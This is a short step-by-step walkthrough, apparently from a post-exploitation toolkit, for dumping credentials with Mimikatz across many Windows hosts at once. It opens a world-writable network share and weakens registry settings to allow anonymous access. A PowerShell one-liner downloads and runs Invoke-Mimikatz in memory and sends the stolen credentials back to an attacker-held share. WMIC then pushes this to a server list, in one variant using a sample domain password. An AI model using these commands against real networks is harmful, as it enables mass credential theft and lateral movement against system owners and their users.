# Mass Mimikatz

1. Make Share:
```
cd\
mkdir open
net share open=C:\open /grant:everyone,full
icacls C:\open\ /grant Everyone:(OI)(CI)F /t
```

2. Set registry keys ([massmimi_reg.rb](https://raw.github.com/mubix/post-exploitation/master/scripts/mass_mimikatz/massmimi_reg.rb) meterpreter script):
```
reg change HKLM\System\CurrentControlSet\services\LanmanServer\Parameters NullSessionShares REG_MULTI_SZ open
reg change HKLM\System\CurrentControlSet\Control\Lsa "EveryoneIncludesAnonymous" 1
```

3. Change directory into new "open" directory

4. Upload powershell script ([powermeup.cmd](https://raw.github.com/mubix/post-exploitation/master/scripts/mass_mimikatz/powermeup.cmd)):
```
powershell "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.127:8080/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds > \\192.168.1.127\open\%COMPUTERNAME%.txt 2>&1
```

5. Upload [clymb3r](http://clymb3r.wordpress.com/)'s Invoke-Mimikatz ps1 - Download from [PowerSploit](https://github.com/mattifestation/PowerSploit) repo: [source on github](https://raw.github.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1)

6. Upload mongoose: [Downloads Page](http://cesanta.com/downloads.html) - Both regular and tiny versions work

7. Upload serverlist.txt - This is a line by line list of computer names to use mimikatz on.
 
8. Execute mongoose (from directory with mimikatz.ps1) - This will start a listener with directory listings enabled on port 8080 by default

9. Execute wmic:
```
wmic /node:@serverlist.txt process call create "\\192.168.92.127\open\powershellme.cmd"
```

9a. Execute wmic with creds:
```
wmic /node:@serverlist.txt /user:PROJECTMENTOR\jdoe /password:ASDqwe123 process call create "\\192.168.92.127\open\powershellme.cmd"
```


## clean up:

1. kill mongoose process
2. net share open /delete
3. kill registry values
4. delete "open" directory
